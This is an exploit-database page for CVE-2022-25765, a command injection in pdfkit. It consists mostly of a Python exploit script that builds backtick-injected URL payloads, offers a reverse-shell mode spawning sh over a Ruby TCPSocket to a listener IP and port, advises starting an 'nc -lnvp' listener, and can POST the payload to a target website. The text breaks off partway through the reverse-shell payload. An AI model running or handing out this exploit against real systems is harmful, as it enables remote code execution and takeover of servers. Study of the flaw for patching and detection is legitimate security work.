---
title: pdfkit v0.8.7.2 Command Injection
url: https://cxsecurity.com/issue/WLB-2023040033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-08
fetch_date: 2025-10-04T11:29:40.529141
---

# pdfkit v0.8.7.2 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pdfkit v0.8.7.2 Command Injection** **2023.04.07**  Credit:  **[UNICORD (NicPWNs & Dev-Yeoj)](https://cxsecurity.com/author/UNICORD%2B%28NicPWNs%2B%26amp%3B%2BDev-Yeoj%29/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-25765](https://cxsecurity.com/cveshow/CVE-2022-25765/ "Click to see CVE-2022-25765")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

#!/usr/bin/env python3
# Exploit Title: pdfkit v0.8.7.2 - Command Injection
# Date: 02/23/2023
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://pdfkit.org/
# Software Link: https://github.com/pdfkit/pdfkit
# Version: 0.0.0-0.8.7.2
# Tested on: pdfkit 0.8.6
# CVE: CVE-2022–25765
# Source: https://github.com/UNICORDev/exploit-CVE-2022-25765
# Description: The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.
# Imports
import time
import sys
import requests
from urllib.parse import quote
class color:
red = '\033[91m'
gold = '\033[93m'
blue = '\033[36m'
green = '\033[92m'
no = '\033[0m'
# Print UNICORD ASCII Art
def UNICORD\_ASCII():
print(rf"""
{color.red} \_ \_\_,~~~{color.gold}/{color.red}\_{color.no} {color.blue}\_\_ \_\_\_ \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ \_\_\_ \_\_\_{color.no}
{color.red} ,~~`( )\_( )-\| {color.blue}/ / / / |/ / \_/ \_\_\_/ \_\_ \/ \_ \/ \_ \{color.no}
{color.red} |/| `--. {color.blue}/ /\_/ / // // /\_\_/ /\_/ / , \_/ // /{color.no}
{color.green}\_V\_\_v\_\_\_{color.red}!{color.green}\_{color.red}!{color.green}\_\_{color.red}!{color.green}\_\_\_\_\_V\_\_\_\_{color.blue}\\_\_\_\_/\_/|\_/\_\_\_/\\_\_\_/\\_\_\_\_/\_/|\_/\_\_\_\_/{color.green}....{color.no}
""")
# Print exploit help menu
def help():
print(r"""UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection
Usage:
python3 exploit-CVE-2022–25765.py -c <command>
python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
python3 exploit-CVE-2022–25765.py -h
Options:
-c Custom command mode. Provide command to generate custom payload with.
-s Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
-w URL of website running vulnerable pdfkit. (Optional)
-p POST parameter on website running vulnerable pdfkit. (Optional)
-h Show this help menu.
""")
exit()
def loading(spins):
def spinning\_cursor():
while True:
for cursor in '|/-\\':
yield cursor
spinner = spinning\_cursor()
for \_ in range(spins):
sys.stdout.write(next(spinner))
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write('\b')
# Run the exploit
def exploit(payload, exploitMode, postArg):
UNICORD\_ASCII()
print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2022–25765 (pdfkit) - Command Injection{color.no}")
loading(15)
print(f"{color.blue}OPTIONS: {color.gold}{modes[exploitMode]}{color.no}")
print(f"{color.blue}PAYLOAD: {color.gold}" + payload + f"{color.no}")
if "web" in exploitMode:
if exploitMode == "webcommand":
print(
f"{color.blue}WARNING: {color.gold}Wrap custom command in \"quotes\" if it has spaces.{color.no}")
else:
print(
f"{color.blue}LOCALIP: {color.gold}{listenIP}:{listenPort}{color.no}")
print(
f"{color.blue}WARNING: {color.gold}Be sure to start a local listener on the above IP and port. \"nc -lnvp {listenPort}\".{color.no}")
print(f"{color.blue}WEBSITE: {color.gold}{website}{color.no}")
print(f"{color.blue}POSTARG: {color.gold}{postArg}{color.no}")
if "http" not in website:
print(
f"{color.blue}ERRORED: {color.red}Make sure website has schema! Like \"http://\".{color.no}")
exit()
postArg = postArg + "=" + quote(payload, safe="")
try:
response = requests.post(website, postArg)
except:
print(
f"{color.blue}ERRORED: {color.red}Couldn't connect to website!{color.no}")
exit()
loading(15)
print(f"{color.blue}EXPLOIT: {color.gold}Payload sent to website!{color.no}")
loading(15)
print(f"{color.blue}SUCCESS: {color.green}Exploit performed action.{color.no}")
elif exploitMode == "command":
print(f"{color.blue}WARNING: {color.gold}Wrap custom command in \"quotes\" if it has spaces.{color.no}")
loading(15)
print(
f"{color.blue}EXPLOIT: {color.green}Copy the payload above into a PDFKit.new().to\_pdf Ruby function or any application running vulnerable pdfkit.{color.no}")
elif exploitMode == "shell":
print(f"{color.blue}LOCALIP: {color.gold}{listenIP}:{listenPort}{color.no}")
print(f"{color.blue}WARNING: {color.gold}Be sure to start a local listener on the above IP and port.{color.no}")
loading(15)
print(
f"{color.blue}EXPLOIT: {color.green}Copy the payload above into a PDFKit.new().to\_pdf Ruby function or any application running vulnerable pdfkit.{color.no}")
exit()
if \_\_name\_\_ == "\_\_main\_\_":
args = ['-h', '-c', '-s', '-w', '-p']
modes = {'command': 'Custom Command Mode',
'shell': 'Reverse Shell Mode',
'webcommand': 'Custom Command Send to Target Website Mode',
'webshell': 'Reverse Shell Sent to Target Website Mode'}
postArg = "url"
if args[0] in sys.argv:
help()
elif args[1] in sys.argv and not args[2] in sys.argv:
try:
if sys.argv[sys.argv.index(args[1]) + 1] in args:
raise
command = sys.argv[sys.argv.index(args[1]) + 1]
except:
print(
f"{color.blue}ERRORED: {color.red}Provide a custom command! \"-c <command>\"{color.no}")
exit()
payload = f"http://%20`{command}`"
mode = "command"
elif args[2] in sys.argv and not args[1] in sys.argv:
try:
if "-" in sys.argv[sys.argv.index(args[2]) + 1]:
raise
listenIP = sys.argv[sys.argv.index(args[2]) + 1]
except:
print(
f"{color.blue}ERRORED: {color.red}Provide a target and port! \"-s <target-IP> <target-port>\"{color.no}")
exit()
try:
if "-" in sys.argv[sys.argv.index(args[2]) + 2]:
raise
listenPort = sys.argv[sys.argv.index(args[2]) + 2]
except:
print(
f"{color.blue}ERRORED: {color.red}Provide a target port! \"-t <target-IP> <target-port>\"{color.no}")
exit()
payload = f"http://%20`ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{str(listenIP)}\",\"{str(liste...